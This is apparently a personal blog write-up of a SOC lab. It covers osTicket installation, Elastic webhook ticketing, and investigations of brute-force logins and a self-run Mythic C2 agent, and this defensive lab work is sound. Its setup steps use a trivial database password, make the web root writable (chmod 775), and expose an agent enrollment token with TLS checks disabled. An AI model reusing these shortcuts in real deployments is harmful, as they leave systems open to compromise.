## osTicket set up
### 1. Machine deployment
The system requirements for the machine to run osTicket are:
- HTTP server running Microsoft® IIS or Apache, PHP version 8.1-8.2, MySQL database version 5.5+.

Because I don't have enough credits in Azure to deploy a Windows Server, I'll be deploying a Ubuntu Server in DigitalOcean.

1) Create cloud instance for the Ubuntu Server.

![](/assets/images/mydfir-challenge/osticket-instance.png)

2) Add machine to the `firewall-soc-challenge-mydfir-ayna` Firewall.

3) Access VM through ssh session and update-upgrade the system.


### 2. Install osTicket requirements

1) Install the LAMP Stack (Linux✔, Apache, MySQL and PHP) and other necessary packages.

```sh
sudo apt install apache2 php8.1 php8.1-cli php8.1-common php8.1-imap php8.1-redis php8.1-snmp php8.1-xml php8.1-zip php8.1-mbstring php8.1-curl php8.1-mysqli php8.1-gd php8.1-intl php8.1-apcu libapache2-mod-php mariadb-server unzip -y 
```

2) Start and enable Apache service.
```sh
sudo systemctl start apache2 && sudo systemctl enable apache2
```

- Check the status is `enabled` and `active (running)`.

```sh
sudo systemctl status apache2
```

3) Check the right PHP version is installed.

```sh
php -v
```

```sh
# my output:
PHP 8.1.2-1ubuntu2.19 (cli) (built: Sep 30 2024 16:25:25) (NTS)              hp8
Copyright (c) The PHP Group                                                  ria
Zend Engine v4.1.2, Copyright (c) Zend Technologies
    with Zend OPcache v8.1.2-1ubuntu2.19, Copyright (c), by Zend Technologies
```

4) Start and enable MariaDB service.

```sh
sudo systemctl start mariadb && sudo systemctl enable mariadb
```

- Check the status is `enabled` and `active (running)`.

```sh
sudo systemctl status apache2
```


5) Run initial security script. 

```sh
mysql_secure_installation
```

- Enter new root password for MariaDB.
- Remove anonymous accounts.
- Disable remote root login.
- Remove test database.
- Reload privilege tables.

6) Access MariaDB.

```sh
mysql
```

7) Create osTicket database and database user.

```sh
create database osticket;
create user osticket@localhost identified by 'osticket';
grant all on osticket.* to osticket@localhost with grant option;
flush privileges;
quit;
```


### 3. Install osTicket

1) Download `osTicket`. The [lastest version](https://github.com/osTicket/osTicket/releases/) at the time of writing is v1.18.1.

```sh
cd /var/www/html
wget https://github.com/osTicket/osTicket/releases/download/v1.18.1/osTicket-v1.18.1.zip
unzip osTicket*.zip -d osTicket
rm osTicket*.zip
```

2) Copy sample configuration file.

```sh
cp /var/www/html/osTicket/upload/include/ost-sampleconfig.php /var/www/html/osTicket/upload/include/ost-config.php
```

3) Set ownership of the osTicket web root directory to web user.

```sh
chown -R www-data:www-data /var/www/html/osTicket/
chmod -R 775 /var/www/html/osTicket/
```

4) Create Apache VirtualHost file for osTicket. This configuration file allows to set up multiple websites on a single server.

```sh
cd /etc/apache2/sites-available
nano osticket.conf
```

- `osTicket.conf` content:

```sh
<VirtualHost *:80>
ServerName 178.62.255.213
DocumentRoot /var/www/html/osTicket/upload

<Directory /var/www/html/osTicket>
AllowOverride All
</Directory>

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

5) Activate the Apache VirtualHost and enable the rewrite module.

```sh
a2enmod rewrite
a2ensite osticket.conf
```

6) Disable default Apache site and enable osTicket site.

```sh
a2dissite 000-default.conf
a2ensite osticket.conf
```

7) Activate new configuration by restarting Apache.

```sh
service apache2 restart
```

8) Access to the osTicket WUI.
	- By navigating to my server's IP, I was redirected to the osTicket installer site.
	- As shown in the picture, all the prerequisites are met and we can click on `Continue`.

![](/assets/images/mydfir-challenge/osticket-installer.png) 

9) Fill the information.

![](/assets/images/mydfir-challenge/fill-form.png) 

- The `MySQL Password` is the password for the osticket Database user.
- Click `Install Now`.

![](/assets/images/mydfir-challenge/installed-osticket.png) 

- Now osTicket is successfully installed.


### 4. Configure file permission

1) Remove write access to osTicket configuration file.

```sh
chmod 0644 /var/www/html/osTicket/upload/include/ost-config.php
```

2) Remove installation directory.

```sh
rm -rf /var/www/html/osTicket/upload/setup
```


### 5. Access osTicket

- Navigating to our public IP now we can access the Support Center, which is for the clients.

![](/assets/images/mydfir-challenge/support-center.png) 

- To access the `Staff Control Panel`, navigate to `http://<osTicket-public-IP>/scp/`.

![](/assets/images/mydfir-challenge/access-scp.png) 

![](/assets/images/mydfir-challenge/logged-in-osticket.png) 

- A new user account can be created in `Users > Add User > Register`. It needs a real email for activation.


## osTicket & ELK integration
### Integrate osTicket with ELK

1) Still in the osTicket SCP web, navigate to `Agent Panel > Admin Panel > Manage > API > Add New API Key`. Copy the API key.

![](/assets/images/mydfir-challenge/add-new-api.png) 

3) On Elastic WUI, navigate to `Management > Stack Management > Alerts and Insights > Connectors > Create connector`. Then I started a 30-Day Trial to be able to use the connectors.

4) Select `Webhook connector`.
	- The URL is my private osTicket IP `/api/tickets.xml` because I made `osticket/upload/` the web root.

![](/assets/images/mydfir-challenge/osticket-connector.png) 

5) Click `Save and Test`.


### Send test alert into osTicket

1) In the test `body` section, paste the [JSON payload sample](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md#json-payload-example) from osTicket github repository.

2) Then, click `run`.

![](/assets/images/mydfir-challenge/run-test-ticket.png) 

3) Confirm it was successful by navigating from the osTicker WUI to `Agent Panel > Tickets`.

![](/assets/images/mydfir-challenge/test-ticket.png) 

![](/assets/images/mydfir-challenge/test-ticket-content.png) 


# G. Suspicious Activity Investigation
## SSH Brute Force Attack Investigation

1) Navigate to `Security > Alerts`. 

2) Choose an alert to investigate.

![](/assets/images/mydfir-challenge/alert-to-investigate.png) 

*Note: rule name changed to `mydfir-ssh-brute-force-attempt-angieyuliananaranjo2751` after noticing it didn't comply with the giveaway rules.*

3) Brute force attack investigation.

> IP `36.189.253.173` 
> User `root`
> - Is this IP known to perform brute force activity?
> 	- Yes, this IP has been reported 194 times and it's classified as an SSH Bruteforcer.
> - [abuseipdb.com](https://www.abuseipdb.com/check/36.189.253.173):
> 
> ![](/assets/images/mydfir-challenge/abuseipdb-report.png)
> 
> - [greynoise.io](https://viz.greynoise.io/ip/36.189.253.173)
> 
> ![](/assets/images/mydfir-challenge/greynoise-report.png) 
>
> - How many brute force attempts there are related to this IP?
> 	 - 762 attempts.
>  
> ![](/assets/images/mydfir-challenge/brute-force-attempts.png) 
>
> - Any other users affected by this IP?
> 	- Only the `root` user.
> - Were any of them successful?
> 	- No. Queried for `source.address:"36.189.253.173" and event.action : "ssh_login" and event.outcome : "success"` and no events were given.
> - If so, what activity occurred after the successful login?
> 	- Nothing.


### Create alert ticket for brute force attempt

1) Set the `server.publicBaseUrl` in the ELK Server to `http://<public-ELK-IP>:<port>`.

```sh
 nano /etc/kibana/kibana.yml
```

![](/assets/images/mydfir-challenge/publicBaseUrl.png) 

```sh
systemctl restart kibana.service
```

2) Edit the SSH failed login rule by navigating to `Security > Rules > Detection rules (SIEM) > Select <your-rule> > Edit rule settings > Actions > Webhook`.

3) Edit action for osTicket webhook to generate the ticket.

![](/assets/images/mydfir-challenge/create-alert-ticket.png) 

- Body:

```json
{
	"alert": true,
	"autorespond": true,
	"source": "API",
	"name": "Elastic",
	"email": "elastic@osticket.com",
	"phone": "3185558634X123",
	"subject": "{{context.rule.name}}",
	"message": """data:text/html,Please investigate the alert generated by <b>{{rule.name}}</b>. --- Description: <i>{{context.rule.description}}</i> --- Link: <b><u>{{rule.url}}</u></b>"""
}
```

- Generated ticket:

![](/assets/images/mydfir-challenge/ssh-bf-ticket.png) 


### Working on ticket demostration
To start working on the ticket, we can assign the ticket to an analyst by clicking on the `Unassigned` field for `Assigned To`.

![](/assets/images/mydfir-challenge/assign-ticket.png) 

And to close the ticket, we can either mark it as `resolved` or `closed`.  Then we can find the closed tickets in the section `Tickets > Closed`.

![](/assets/images/mydfir-challenge/closed-ticket.png) 


## RDP Brute Force Attack Investigation
Same as before, to investigate an RDP brute force attack, we'll look into our RDP brute force attempts alerts.

1) Navigate to `Security > Alerts`. 

2) Choose an alert to investigate.

![](/assets/images/mydfir-challenge/rdp-alert-to-investigate.png) 

> - Is this IP known to perform brute force activity?
> 	- No.
> - How many brute force attempts there are related to this IP?
>	- 44.
> 
> ![](/assets/images/mydfir-challenge/rdp-brute-force-attempts.png) 
> 
> - Any other users affected by this IP?
> 	- Only `azureuser`.
> - Were any of them successful?
> 	- Changing the `event.code` to 4624, I get 9 events.
> 	- *Note: because the attack was done from my own public IP and some of these events are legitimate, I limited the timeframe from the first logon attempt date done through Kali.*
>
> ![](/assets/images/mydfir-challenge/rdp-connections.png) 
>
> - If so, what activity occurred after the successful login?
> 	- The first succesful login event occurred on `Nov 19, 2024 @ 16:07:45.413`. 
> 	- The query `agent.name : "mydfir-win-ayna" and 0x3b8427` searches for events with the logon ID associated to that first login event. The result gives back 1082 events that span during less than 8 seconds, which suggests a scan obtaining the password.
> 	- There are multiple short sessions that indicate a scan:
> 		- Session with login ID `0x67c155` lasts also 2 seconds, from `16:30:06.651` to `16:30:08.021`.
> 		- Session `0xb99455`: `17:16:28.023` - `17:16:28.753`.
> 		- Session `0xe16b5d`: `17:34:40.158` - `17:34:41.465`.
> 	- While a few other sessions persisted for longer and deserve to be to investigated in deep:
> 		- Session `0xb99455`: `17:16:28.023` - `17:34:32.475`.
> 		- Session `0xe16b5d`: `17:34:40.158` - `17:39:59.218`.
> 		- Session `0xa266a`: `17:42:07.779` - `18:08:52.089`.
> 		- Session `0x273661`: `18:21:31.478` - `18:55:52.718`.
> 		- Session `0x1b5923`: `19:01:10.321` - `19:15:58.663`.
> 		- Session `0x136e69`: `19:19:12.728` - `20:53:36.956`.
> - The next and last session started on `Nov 21, 2024 @ 13:36:00.399`, which indicates the potential end time of the compromise on `Nov 21, 2024 @ 15:04:48.023`.


### Create alert ticket for brute force attempt
This ticket is created in the same way as the previous one.

1) Edit the RDP failed login rule by navigating to `Security > Rules > Detection rules (SIEM) > Select <your-rule> > Edit rule settings > Actions > Webhook`.

2) Edit action for osTicket webhook to generate the ticket. And copy and paste the same body from the SSH rule.

3) Save the changes and then the ticket generation is ready for new alerts.

4) Generated ticket example:

![](/assets/images/mydfir-challenge/rdp-bf-ticket.png) 


## Mythic Agent Investigation
To identify C2 activity, we have to investigation process creation and processes that initiated a network connection (Sysmon Event IDs 1 and 3). We previously created a dashboard showcasing theses events.

1) Navigate to `Analytics > Dashboards > MyDFIR-Suspicious-Activity`. 

2) There we can identify suspicious activity that could reveal C2 connections. Especially from the processes that initiate an outbound network connection.

![](/assets/images/mydfir-challenge/initiated-network-connection.png) 

> - We see an odd process executed from the Public directory initiating an Internet connection.
>	- Process: `C:\Users\Public\Downloads\svchost-angieyuliananaranjo2751.exe` - Destination: `128.199.50.62:80`.
> - The `powershell.exe` process also makes 3 connections to this same IP through port `9999`.
>	- Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` - Destination: `128.199.50.62:9999`.
> - We can look for the related events with query `event.code: 3 and winlog.event_data.DestinationIp: 128.199.50.62`.
>
> ![](/assets/images/mydfir-challenge/ip-network-connection.png) 
> 
> - Searching for the first event process GUID, we can correlate with all the events generated from the suspicious powershell session.
> 
> ![](/assets/images/mydfir-challenge/process-guid.png)  
> 
> - We can see a few network connections from this session to the same suspicious IP. Then a File Created event for `svchost-angieyuliananaranjo2751.exe`. This same process was later executed in the same session.
> - Then we can look for this executable's process GUID. 
> 
> ![](/assets/images/mydfir-challenge/process-guid2.png) 
> 
> - DLLs from 'Microsoft .NET Runtime...' that run the CLR (`clr.dll`, `clrjit.dll`, `mscoreei.dll`...) are loaded, which implies the executable is a .NET based application.
> - This process then establishes a network connection with IP `128.199.50.62` through port `80`.
> - And the process was in execution until `15:01:02.923`. We can narrow the timeframe until that time to see if we find any other suspicious events.
> - Focusing specially in `Process Create` events, we find 35 events.
> 
> ![](/assets/images/mydfir-challenge/open-file.png)
>
> - There we see the file `passwords.txt.txt` with sensitive information was opened.
> - Also, there are multiple `netstat` and a `findstr` commands, which can be used to gather information.
> - To investigate further and to be able to find the C2 activity, we'd need a software capturing the network traffic. But the correlated events should be enough to point to an establish Command & Control connection.  

> **Indicators of Compromise**
> - File: `C:\Users\Public\Downloads\svchost-angieyuliananaranjo.exe` with SHA1: `8916A1B67F942565EC651F3B2B728ED26E00574D`
> - Outbound network connections: `128.199.50.62` through ports `9999` and `80`.
> - Opened file with sensitive data `passwords.txt.txt`.
{: .notice--primary}
> **Timeline**
> - `Nov 21, 2024 @ 13:38:11.917` - **Network connection** towards 128.199.50.62:9999.
> - `Nov 21, 2024 @ 13:44:52.521` - **Network connection**  ...
> - `Nov 21, 2024 @ 13:45:19.882` - **File created** `svchost-angieyuliananaranjo2751.exe` on `C:\Users\Public\Downloads\`.
> - `Nov 21, 2024 @ 13:45:21.052` - **Network connection** ...
> - `Nov 21, 2024 @ 14:08:02.637` - **Process created** `svchost-angieyuliananaranjo2751.exe` - PID `4916`.
> - `Nov 21, 2024 @ 14:08:05.755` - **Network connection** towards 128.199.50.62:80
> - `Nov 21, 2024 @ 14:10:35.798` - **Process created** `powershell.exe` 
> - `Nov 21, 2024 @ 14:33:38.558` - **Process created** `notepad.exe` opens `passwords.txt.txt`.
> - `Nov 21, 2024 @ 15:01:02.923` - **Process terminated** `svchost-angieyuliananaranjo2751.exe`.
{: .notice--primary}


### Create alert ticket for Mythic agent execution
We already created a rule for the Apollo Agent execution. So, we can also create an action for ticket generation by following the same steps as before.

1) `Edit rule settings` for the `MyDFIR-Mythic-C2-Apollo-Agent-Detected` rule.

2) Select `Webhook > osTicket` and paste the same ticket body we used before.

3) Recreate the agent execution in the Windows Server to generate a ticket.

4) Accept the ticket and investigate the alert.
- Ticket:

![](/assets/images/mydfir-challenge/apollo-ticket.png) 

- Event that triggered the alert:

![](/assets/images/mydfir-challenge/apollo-events.png) 


# H. Elastic Defend Setup & Response Action
The last step of this project challenge is setting up the Elastic EDR solution, `Elastic Defend`, and making a demostration of how it detects and responds to a threat.

**> Steps to set up Elastic Defend:**

1) Navigate to `Managemente > Integrations` and select `Elastic Defend > Add Elastic Defend`.  

2) Select the configuration to integrate the EDR with the Windows Server.

![](/assets/images/mydfir-challenge/elastic-defend-integration.png) 

3) Save configuration and select `add agent to hosts`.

![](/assets/images/mydfir-challenge/add-agent-to-hosts.png) 

4) Due to some unexpected issue, the agent in the Windows Server was inactive and wouldn't communicate with the Fleet Server. So I unenrolled the agent and enrolled it again with this command:

```powershell
.\elastic-agent enroll --url=https://146.190.19.13:8220 --enrollment-token=bWJXeWZaTUItSkl3MVk2ZFhKNHU6SENJOEFGX29SbGlXcm00RFBWWmVQdw== --insecure
```

Then the EDR was successfully integrated.

**> Elastic Defend in action:**

1) In the Windows Server, try to run the Mythic Agent. The Elastic Defend detects it as malware and prevents its execution.

![](/assets/images/mydfir-challenge/mal-alert.png) 

2) This generated an alert with key information.

![](/assets/images/mydfir-challenge/mal-full-alert.png) 

3) We can also configure a response action for this rule by selecting the rule and `edit rule settings`. 

4) Under `Response Actions`, select `Elastic Defend`. We can select actions `isolate`, `kill process` or `suspend process`.

![](/assets/images/mydfir-challenge/response-action.png) 

5) To put the response action to test, download the payload in the Windows Server again.

6) Immediately after the payload was downloaded, Elastic Defend quarantined the file and isolated the host.

![](/assets/images/mydfir-challenge/isolated.png) 

![](/assets/images/mydfir-challenge/alert-isolated.png) 

This finally demostrates how an EDR integration can detect and respond to threats with predefined rules (by Elastic in this case). However, this project also demostrates how an analyst can identify a potential threat through log analysis.

---

If you read until here, first, thank you for your attention. And second, please, don't hesitate to share your thoughts with me on [Linkedin](https://www.linkedin.com/in/angie-yuliana-naranjo/){: .btn .btn--info}.
